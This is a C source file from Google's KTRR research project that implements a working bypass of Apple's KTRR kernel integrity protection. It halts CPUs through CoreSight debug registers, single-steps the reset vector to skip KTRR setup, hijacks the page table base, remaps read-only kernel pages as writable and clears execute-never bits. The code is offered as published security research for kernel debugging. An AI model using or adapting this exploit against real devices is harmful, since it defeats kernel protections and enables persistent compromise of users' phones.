//
// Project: KTRW
// Author:  Brandon Azad <bazad@google.com>
//
// Copyright 2019 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//

#include "ktrr_bypass.h"

#include <assert.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <pthread.h>
#include <stdlib.h>
#include <unistd.h>

#include "kernel_call.h"
#include "kernel_memory.h"
#include "kernel_slide.h"
#include "ktrr_bypass_parameters.h"
#include "log.h"


// The page table base.
static uint64_t ttbr1_el1;

// ---- Utility functions -------------------------------------------------------------------------

/*
 * kvtophys
 *
 * Description:
 * 	Convert a kernel virtual address to a physical address.
 */
static uint64_t
kvtophys(uint64_t kvaddr) {
	uint64_t ppnum = kernel_call_7(ADDRESS(pmap_find_phys), 2, kernel_pmap, kvaddr);
	return (ppnum << 14) | (kvaddr & ((1 << 14) - 1));
}

/*
 * kernel_io_map
 *
 * Description:
 * 	Call the kernel function (ml_)io_map().
 */
static uint64_t
kernel_io_map(uint64_t physaddr, uint64_t size) {
	uint32_t addr32 = kernel_call_7(ADDRESS(ml_io_map), 2, physaddr, size);
	for (uint64_t base = 0xffffffe000000000; base != 0; base += 0x100000000) {
		uint64_t kvaddr = base | addr32;
		if (kvtophys(kvaddr) == physaddr) {
			return kvaddr;
		}
	}
	return 0;
}

/*
 * kernel_ioread32
 *
 * Description:
 * 	Perform a 32-bit read of IO memory.
 */
static uint32_t
kernel_ioread32(uint64_t kvaddr) {
	return kernel_call_7(ADDRESS(ldr_w0_x0__ret), 1, kvaddr);
}

/*
 * kernel_iowrite32
 *
 * Description:
 * 	Perform a 32-bit write to IO memory.
 */
static void
kernel_iowrite32(uint64_t kvaddr, uint32_t value) {
	kernel_call_7(ADDRESS(str_w1_x0__ret), 2, kvaddr, value);
}

/*
 * kernel_ioread64
 *
 * Description:
 * 	Perform a 64-bit read of IO memory.
 */
__attribute__((unused))
static uint64_t
kernel_ioread64(uint64_t kvaddr) {
	return kernel_read64(kvaddr);
}

/*
 * kernel_iowrite64
 *
 * Description:
 * 	Perform a 64-bit write to IO memory.
 */
static void
kernel_iowrite64(uint64_t kvaddr, uint64_t value) {
	kernel_write64(kvaddr, value);
}

/*
 * phys_read64
 *
 * Description:
 * 	Read a 64-bit value from the specified physical address.
 */
static uint64_t
phys_read64(uint64_t paddr) {
	union {
		uint32_t u32[2];
		uint64_t u64;
	} u;
	u.u32[0] = kernel_call_7(ADDRESS(ml_phys_read_data), 2, paddr, 4);
	u.u32[1] = kernel_call_7(ADDRESS(ml_phys_read_data), 2, paddr + 4, 4);
	return u.u64;
}

/*
 * phys_write64
 *
 * Description:
 * 	Write a 64-bit value to the specified physical address.
 */
static void
phys_write64(uint64_t paddr, uint64_t value) {
	kernel_call_7(ADDRESS(ml_phys_write_data), 3, paddr, value, 8);
}

// ---- KTRR Bypass -------------------------------------------------------------------------------

/*
 * map_coresight_registers
 *
 * Description:
 * 	Map the coresight registers into kernel memory.
 */
static void
map_coresight_registers(uint32_t cpu_id, uint64_t *ed_mmio, uint64_t *utt_mmio) {
	uint64_t cpu_data_offset = cpu_id * SIZE(cpu_data_entry)
		+ OFFSET(cpu_data_entry, cpu_data_vaddr);
	uint64_t cpu_data = kernel_read64(ADDRESS(CpuDataEntries) + cpu_data_offset);
	uint64_t cpu_regmap_paddr = kernel_read64(cpu_data + OFFSET(cpu_data, cpu_regmap_paddr));
	assert((cpu_regmap_paddr & 0x3fff) == 0);
	uint64_t ed_map = kernel_read64(cpu_data + OFFSET(cpu_data, ed_mmio));
	uint64_t utt_map = kernel_read64(cpu_data + OFFSET(cpu_data, utt_mmio));
	if (ed_map == 0) {
		ed_map = kernel_io_map(cpu_regmap_paddr + 0x00000, 4096);
		kernel_write64(cpu_data + OFFSET(cpu_data, ed_mmio), ed_map);
	}
	if (utt_map == 0) {
		utt_map = kernel_io_map(cpu_regmap_paddr + 0x30000, 4096);
		kernel_write64(cpu_data + OFFSET(cpu_data, utt_mmio), utt_map);
	}
	*ed_mmio = ed_map;
	*utt_mmio = utt_map;
	DEBUG_TRACE(2, "cpu_data   = %llx", cpu_data);
	DEBUG_TRACE(2, "cpu_regmap = %llx", cpu_regmap_paddr);
	DEBUG_TRACE(2, "ed_mmio    = %llx", ed_map);
	DEBUG_TRACE(2, "utt_mmio   = %llx", utt_map);
}

#define DBGWRAP_Restart		(1uL << 30)
#define DBGWRAP_HaltAfterReset	(1uL << 29)	// EDECR.RCE ?
#define DBGWRAP_DisableReset	(1uL << 26)	// EDPRCR.CORENPDRQ ?

/*
 * disable_ktrr_and_set_ttbr1_on_cpu
 *
 * Description:
 * 	This function uses the External Debug registers and the DBGWRAP register to single-step
 * 	execution of the reset vector and modify register state in order to skip KTRR
 * 	initialization and set a custom value for TTBR1_EL1. Future core resets are disabled to
 * 	persist the KTRR bypass as long as possible.
 */
static bool
disable_ktrr_and_set_ttbr1_on_cpu(
		uint32_t cpu_id,
		uint64_t ttbr1_el1) {
	// Map access to the External Debug registers and DBGWRAP register.
	uint64_t ed_mmio, utt_mmio;
	map_coresight_registers(cpu_id, &ed_mmio, &utt_mmio);
	uint64_t edecr_reg    = ed_mmio + 0x024;
	uint64_t dbgdtrrx_reg = ed_mmio + 0x080; // Updates DTRRX
	uint64_t editr_reg    = ed_mmio + 0x084;
	uint64_t edscr_reg    = ed_mmio + 0x088;
	uint64_t dbgdtrtx_reg = ed_mmio + 0x08c; // Updates DTRTX
	uint64_t edrcr_reg    = ed_mmio + 0x090;
	uint64_t oslar_reg    = ed_mmio + 0x300;
	uint64_t edprsr_reg   = ed_mmio + 0x314;
	uint64_t edlar_reg    = ed_mmio + 0xfb0;
	uint64_t edlsr_reg    = ed_mmio + 0xfb4;
	uint64_t dbgwrap_reg  = utt_mmio + 0x000;
	__block uint32_t edprsr;

	// Set EDLAR to unlock the CoreSight External Debug registers.
	DEBUG_TRACE(2, "Unlock CoreSight External Debug for CPU %u", cpu_id);
	uint32_t edlsr = kernel_ioread32(edlsr_reg);
	DEBUG_TRACE(2, "EDLSR = %x", edlsr);
	kernel_iowrite32(edlar_reg, 0xc5acce55);
	edlsr = kernel_ioread32(edlsr_reg);
	DEBUG_TRACE(2, "EDLSR = %x", edlsr);
	assert((edlsr & (1 << 1)) == 0);

	// Request that the CPU halt in debug on next reset.
	DEBUG_TRACE(1, "Set CPU %u to halt on next reset", cpu_id);
	kernel_iowrite64(dbgwrap_reg, DBGWRAP_HaltAfterReset);

	// Wait for the CPU to halt in debug state.
	do {
		edprsr = kernel_ioread32(edprsr_reg);
	} while ((edprsr & (1 << 4)) == 0);

	// The CPU is now halted in Debug state at reset.
	DEBUG_TRACE(1, "Halted CPU %u in debug state", cpu_id);
	DEBUG_TRACE(2, "DBGWRAP = %llx, EDPRSR = %x", kernel_ioread64(dbgwrap_reg), edprsr);

	// Unlock the OS Lock.
	kernel_iowrite32(oslar_reg, 0);

	// A function to execute a single instruction on the CPU while it is in Debug state.
	bool (^exec_insn)(uint32_t) = ^bool(uint32_t insn) {
		kernel_iowrite32(editr_reg, insn);
		for (size_t i = 0; i < 4; i++) {
			uint32_t edscr = kernel_ioread32(edscr_reg);
			if (edscr & (1 << 6)) {
				break;
			}
			if (edscr & (1 << 24)) {
				return true;
			}
		}
		kernel_iowrite32(edrcr_reg, (1 << 2));
		ERROR("Failed to execute instruction %08x", insn);
		return false;
	};

	// A function to read the value in a general purpose register.
	uint64_t (^read_X)(uint32_t) = ^uint64_t(uint32_t x_reg) {
		bool ok = exec_insn(0xD5130400 | (x_reg & 0x1f));
		assert(ok);
		uint64_t dtrrx = kernel_ioread32(dbgdtrrx_reg);
		uint64_t dtrtx = kernel_ioread32(dbgdtrtx_reg);
		return (dtrrx << 32) | dtrtx;
	};

	// A function to write a value to a general purpose register.
	void (^write_X)(uint32_t, uint64_t) = ^void(uint32_t x_reg, uint64_t value) {
		kernel_iowrite32(dbgdtrtx_reg, (value >> 32) & 0xffffffff);
		kernel_iowrite32(dbgdtrrx_reg, value & 0xffffffff);
		bool ok = exec_insn(0xD5330400 | (x_reg & 0x1f));
		assert(ok);
	};

	// A function to read the value of PC.
	uint64_t (^read_PC)(void) = ^uint64_t() {
		uint64_t x7 = read_X(7);
		exec_insn(0xD53B4520 | 7);		// MRS X7, DLR_EL0
		uint64_t pc = read_X(7);
		write_X(7, x7);
		return pc;
	};

	// A function to single-step the CPU. This only works after EDECR.SS has been set.
	void (^step)(void) = ^{
		// Continue to execute 1 instruction.
		kernel_iowrite64(dbgwrap_reg, DBGWRAP_Restart);
		// Wait until we exit debug state.
		do {
			edprsr = kernel_ioread32(edprsr_reg);
		} while ((edprsr & (1 << 11)) == 0);
		// Wait until we re-enter debug state.
		while ((edprsr & (1 << 4)) == 0) {
			edprsr = kernel_ioread32(edprsr_reg);
		}
	};

	// Set EDECR.SS to single-step execution.
	kernel_iowrite32(edecr_reg, (1 << 2));

	// Single-step execution through the reset vector.
	for (size_t insn_count = 0;;) {
		// Get the value of PC and the current instruction.
		uint64_t pc = read_PC();
		uint32_t insn = kernel_read32(pc - gPhysBase + gVirtBase);
		DEBUG_TRACE(2, "PC = %llx, insn = %08x", pc, insn);
		// Subvert control flow at 2 critical points: when we're about to do KTRR
		// initialization and when we're about to set TTBR1_EL1. Since TTBR1_EL1 can be set
		// many times, we stop once we're about to set SCTLR_EL1.
		if ((insn & 0xffff001f) == (0xb4000000 | 17)) { // CBZ X17, Lskip_ktrr
			DEBUG_TRACE(1, "Skipping KTRR initialization");
			write_X(17, 0);
		} else if (insn == 0xd5182020) { // MSR TTBR1_EL1, X0
			DEBUG_TRACE(1, "Hijacking TTBR1_EL1 %llx -> %llx", read_X(0), ttbr1_el1);
			write_X(0, ttbr1_el1);
		} else if (insn == 0xd5181000) { // MSR SCTLR_EL1, X0
			DEBUG_TRACE(2, "About to set SCTLR_EL1");
			break;
		}
		// Single-step execution.
		step();
		insn_count++;
		if (insn_count >= 2048) {
			WARNING("LowResetVectorBase does not follow the expected format");
			break;
		}
	}

	// Restart the CPU. First clear EDECR.SS to disable single-stepping, then set DBGWRAP to
	// restart the CPU out of debug state while disabling future core resets (preserving the
	// KTRR bypass).
	DEBUG_TRACE(1, "Restarting CPU %u", cpu_id);
	kernel_iowrite32(edecr_reg, 0);
	kernel_iowrite64(dbgwrap_reg, DBGWRAP_Restart | DBGWRAP_DisableReset);

	DEBUG_TRACE(2, "DBGWRAP = %llx, EDPRSR = %x",
			kernel_ioread64(dbgwrap_reg), kernel_ioread32(edprsr_reg));

	return true;
}

// ---- Remapping RoRgn ---------------------------------------------------------------------------

/*
 * aarch64_page_table_lookup
 *
 * Description:
 * 	Perform a page table lookup. Returns the physical address.
 *
 * Parameters:
 * 	ttb		The translation table base address (from TTBR0_EL1 or TTBR1_EL1).
 * 	p_l1_tte	The address of the L1 TTE.
 * 	l1_tte		The L1 TTE.
 * 	p_l2_tte	The address of the L2 TTE.
 * 	l2_tte		The L2 TTE.
 * 	p_l3_tte	The address of the L3 TTE.
 * 	l3_tte		The L3 TTE.
 */
static uint64_t
aarch64_page_table_lookup(uint64_t ttb,
		uint64_t vaddr,
		uint64_t *p_l1_tte0, uint64_t *l1_tte0,
		uint64_t *p_l2_tte0, uint64_t *l2_tte0,
		uint64_t *p_l3_tte0, uint64_t *l3_tte0) {
	const uint64_t pg_bits = 14;
	const uint64_t l1_size = 3;
	const uint64_t l2_size = 11;
	const uint64_t l3_size = 11;
	const uint64_t tte_physaddr_mask = ((1uLL << 40) - 1) & ~((1 << pg_bits) - 1);
	uint64_t l1_table = ttb;
	uint64_t l1_index = (vaddr >> (l2_size + l3_size + pg_bits)) & ((1 << l1_size) - 1);
	uint64_t l2_index = (vaddr >> (l3_size + pg_bits)) & ((1 << l2_size) - 1);
	uint64_t l3_index = (vaddr >> pg_bits) & ((1 << l3_size) - 1);
	uint64_t pg_offset = vaddr & ((1 << pg_bits) - 1);
	uint64_t p_l1_tte = l1_table + 8 * l1_index;
	if (p_l1_tte0 != NULL) {
		*p_l1_tte0 = p_l1_tte;
	}
	uint64_t l1_tte = phys_read64(p_l1_tte);
	if (l1_tte0 != NULL) {
		*l1_tte0 = l1_tte;
	}
	if ((l1_tte & 3) != 3) {
		return -1;
	}
	uint64_t l2_table = l1_tte & tte_physaddr_mask;
	uint64_t p_l2_tte = l2_table + 8 * l2_index;
	if (p_l2_tte0 != NULL) {
		*p_l2_tte0 = p_l2_tte;
	}
	uint64_t l2_tte = phys_read64(p_l2_tte);
	if (l2_tte0 != NULL) {
		*l2_tte0 = l2_tte;
	}
	if ((l2_tte & 3) != 3) {
		return -1;
	}
	uint64_t l3_table = l2_tte & tte_physaddr_mask;
	uint64_t p_l3_tte = l3_table + 8 * l3_index;
	if (p_l3_tte0 != NULL) {
		*p_l3_tte0 = p_l3_tte;
	}
	uint64_t l3_tte = phys_read64(p_l3_tte);
	if (l3_tte0 != NULL) {
		*l3_tte0 = l3_tte;
	}
	if ((l3_tte & 3) != 3) {
		return -1;
	}
	uint64_t frame = l3_tte & tte_physaddr_mask;
	return frame | pg_offset;
}

/*
 * clear_pxn_from_tte
 *
 * Description:
 * 	Clears the PXN bit from a TTE in a translation table page.
 */
static uint64_t
clear_pxn_from_tte(unsigned level, uint64_t tte) {
	if (0 <= level && level <= 2) {	// L0, L1, L2
		if ((tte & 0x3) == 0x3) {	// Table
			tte &= ~(1uLL << 59);	// PXNTable
		} else if (level == 2 && (tte & 0x3) == 0x1) {	// Block
			tte &= ~(1uLL << 53);	// PXN
		}
	}
	if (level == 3) {	// L3
		if ((tte & 0x3) == 0x3) {	// Page
			tte &= ~(1uLL << 53);	// PXN
		}
	}
	return tte;
}

/*
 * clear_pxn_from_ttes
 *
 * Description:
 * 	Clears the PXN bit from TTEs in a translation table page.
 */
static void
clear_pxn_from_ttes(unsigned level, void *tt_page) {
	uint64_t *ttes = tt_page;
	for (size_t i = 0; i < page_size / sizeof(*ttes); i++) {
		ttes[i] = clear_pxn_from_tte(level, ttes[i]);
	}
}

/*
 * remap_rorgn_page
 *
 * Description:
 * 	Remaps a page in the RoRgn so that it is writable.
 */
static uint64_t
remap_rorgn_page(uint64_t *ttbr1_el1, uint64_t kvaddr) {
	const uint64_t page_mask = ~(page_size - 1);
	uint8_t buf[page_size];
	uint64_t p_l1_tte = 0, l1_tte = 0, p_l2_tte = 0, l2_tte = 0, p_l3_tte = 0, l3_tte = 0;
	uint64_t l1_table_p = *ttbr1_el1;
	uint64_t addr_p = aarch64_page_table_lookup(l1_table_p, kvaddr,
			&p_l1_tte, &l1_tte, &p_l2_tte, &l2_tte, &p_l3_tte, &l3_tte);
	if (rorgn_begin <= p_l1_tte && p_l1_tte < rorgn_end) {
		// The L1 TTE is in the RoRgn, so TTBR1_EL1 points into a RoRgn page. Remap the L1
		// table.
		uint64_t new_l1_table_v = kernel_vm_allocate(page_size);
		uint64_t l1_table_v = l1_table_p - gPhysBase + gVirtBase;
		kernel_read(l1_table_v, buf, page_size);
		clear_pxn_from_ttes(1, buf);
		kernel_write(new_l1_table_v, buf, page_size);
		uint64_t new_l1_table_p = kvtophys(new_l1_table_v);
		*ttbr1_el1 = new_l1_table_p;
		p_l1_tte = p_l1_tte - l1_table_p + new_l1_table_p;
	}
	if (rorgn_begin <= p_l2_tte && p_l2_tte < rorgn_end) {
		// The L2 TTE is in the RoRgn. Remap the L2 table.
		uint64_t l2_table_p = p_l2_tte & page_mask;
		uint64_t new_l2_table_v = kernel_vm_allocate(page_size);
		uint64_t l2_table_v = l2_table_p - gPhysBase + gVirtBase;
		kernel_read(l2_table_v, buf, page_size);
		clear_pxn_from_ttes(2, buf);
		kernel_write(new_l2_table_v, buf, page_size);
		uint64_t new_l2_table_p = kvtophys(new_l2_table_v);
		uint64_t new_l1_tte = l1_tte - l2_table_p + new_l2_table_p;
		phys_write64(p_l1_tte, new_l1_tte);
		p_l2_tte = p_l2_tte - l2_table_p + new_l2_table_p;
	}
	if (rorgn_begin <= p_l3_tte && p_l3_tte < rorgn_end) {
		// The L3 TTE is in the RoRgn. Remap the L3 table.
		uint64_t l3_table_p = p_l3_tte & page_mask;
		uint64_t new_l3_table_v = kernel_vm_allocate(page_size);
		uint64_t l3_table_v = l3_table_p - gPhysBase + gVirtBase;
		kernel_read(l3_table_v, buf, page_size);
		clear_pxn_from_ttes(3, buf);
		kernel_write(new_l3_table_v, buf, page_size);
		uint64_t new_l3_table_p = kvtophys(new_l3_table_v);
		uint64_t new_l2_tte = l2_tte - l3_table_p + new_l3_table_p;
		phys_write64(p_l2_tte, new_l2_tte);
		p_l3_tte = p_l3_tte - l3_table_p + new_l3_table_p;
	}
	if (rorgn_begin <= addr_p && addr_p < rorgn_end) {
		// The page is in the RoRgn. Remap the page. Also set write permission in the TTE
		// and clear the contiguous bit (since the kernel is now physically
		// non-contiguous).
		uint64_t new_page_v = kernel_vm_allocate(page_size);
		kernel_read(kvaddr, buf, page_size);
		kernel_write(new_page_v, buf, page_size);
		uint64_t new_page_p = kvtophys(new_page_v);
		uint64_t new_l3_tte = l3_tte - addr_p + new_page_p;
		new_l3_tte &= ~(1uL << 52);     // Clear Contiguous
		new_l3_tte &= ~(3uL << 6);      // Set AP[2:1] = 00 (grants EL1 RW access)
		phys_write64(p_l3_tte, new_l3_tte);
		kvaddr = new_page_v;
	}
	return kvaddr;
}

// A worker thread for activity_thread that just spins.
static void *
worker_thread(void *arg) {
	uint64_t end = *(uint64_t *)arg;
	for (;;) {
		close(-1);
		uint64_t now = mach_absolute_time();
		if (now >= end) {
			break;
		}
	}
	return NULL;
}

// A thread to alternately spin and sleep.
static void *
activity_thread(void *arg) {
	volatile bool *running = arg;
	struct mach_timebase_info tb;
	mach_timebase_info(&tb);
	const unsigned milliseconds = 40;
	const unsigned worker_count = 10;
	while (*running) {
		// Spin for one period on multiple threads.
		uint64_t start = mach_absolute_time();
		uint64_t end = start + milliseconds*1000*1000 * tb.denom / tb.numer;
		pthread_t worker[worker_count];
		for (unsigned i = 0; i < worker_count; i++) {
			pthread_create(&worker[i], NULL, worker_thread, &end);
		}
		worker_thread(&end);
		for (unsigned i = 0; i < worker_count; i++) {
			pthread_join(worker[i], NULL);
		}
		// Sleep for one period.
		usleep(milliseconds*1000);
	}
	return NULL;
}

// ---- Public API --------------------------------------------------------------------------------

bool
have_ktrr_bypass() {
	return ktrr_bypass_parameters_init();
}

void
ktrr_bypass() {
	// Initialize the parameters.
	bool ok = ktrr_bypass_parameters_init();
	assert(ok);
	// Remap the pages in the RoRgn so that each virtual address maps to a new physical page
	// that is writable.
	ttbr1_el1 = cpu_ttep;
	for (uint64_t ropage = rorgn_begin; ropage < rorgn_end; ropage += page_size) {
		uint64_t kvaddr = ropage - gPhysBase + gVirtBase;
		DEBUG_TRACE(2, "Remapping %llx", kvaddr - kernel_slide);
		remap_rorgn_page(&ttbr1_el1, kvaddr);
	}
	// Start a thread with an uneven activity pattern so that we're more likely to be bumped
	// around CPUs, which helps the KTRR bypass work more quickly.
	pthread_t pthread;
	bool run = true;
	pthread_create(&pthread, NULL, activity_thread, &run);
	// Disable KTRR and use the new page table base.
	for (uint32_t cpu_id = 0; cpu_id < platform.physical_cpu; cpu_id++) {
		disable_ktrr_and_set_ttbr1_on_cpu(cpu_id, ttbr1_el1);
	}
	// Join the thread.
	run = false;
	pthread_join(pthread, NULL);
}

void
ktrr_vm_protect(uint64_t address, size_t size, int prot) {
	kernel_vm_protect(address, size, prot);
	if (prot & VM_PROT_EXECUTE) {
		const uint64_t page_mask = ~(page_size - 1);
		uint64_t start = address & page_mask;
		uint64_t end = (address + size + page_size - 1) & page_mask;
		for (uint64_t page = start; page < end; page += page_size) {
			uint64_t p_l3_tte = 0, l3_tte = 0;
			uint64_t page_p = aarch64_page_table_lookup(ttbr1_el1, page,
					NULL, NULL, NULL, NULL, &p_l3_tte, &l3_tte);
			if (page_p != -1) {
				uint64_t new_l3_tte = clear_pxn_from_tte(3, l3_tte);
				phys_write64(p_l3_tte, new_l3_tte);
			}
		}
	}
}
